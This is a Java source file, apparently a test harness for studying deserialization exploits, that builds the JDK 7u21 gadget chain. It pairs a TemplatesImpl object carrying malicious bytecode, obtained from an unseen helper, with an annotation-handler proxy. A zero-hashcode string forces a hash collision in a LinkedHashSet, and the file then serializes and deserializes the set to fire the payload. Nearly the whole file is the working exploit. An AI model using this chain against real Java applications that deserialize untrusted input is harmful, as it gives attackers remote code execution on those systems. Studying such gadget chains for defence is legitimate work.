package TestJdk;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import expUtils.ExpUtils;
import expUtils.ReflectUtils;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.LinkedHashSet;

public class Test7u21 {
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {

        System.out.println(System.getProperty("java.version"));
        Object templates = ExpUtils.getEvilTemplates();
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");


        InvocationHandler tempHandler =  ExpUtils.getAnnotationHandler(map);
        ReflectUtils.setFields(tempHandler,"type", Templates.class);
        Templates templatesPeoxy = (Templates) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Templates.class},tempHandler);

        LinkedHashSet set = new LinkedHashSet();
        System.out.println("templates hashcode:" + templates.hashCode());
        System.out.println(0^templates.hashCode());
        System.out.println("templatesPeoxy hashcode:" + templatesPeoxy.hashCode());
        set.add(templates);
        set.add(templatesPeoxy);

        ReflectUtils.setFields(templates,"_auxClasses",null);
        ReflectUtils.setFields(templates,"_class",null);
        map.put(zeroHashCodeStr,templates);

//        templates.getOutputProperties();

        String path =  ExpUtils.serialize(set);
        ExpUtils.unserialize(path);
        System.out.println("跑完了");
    }
}
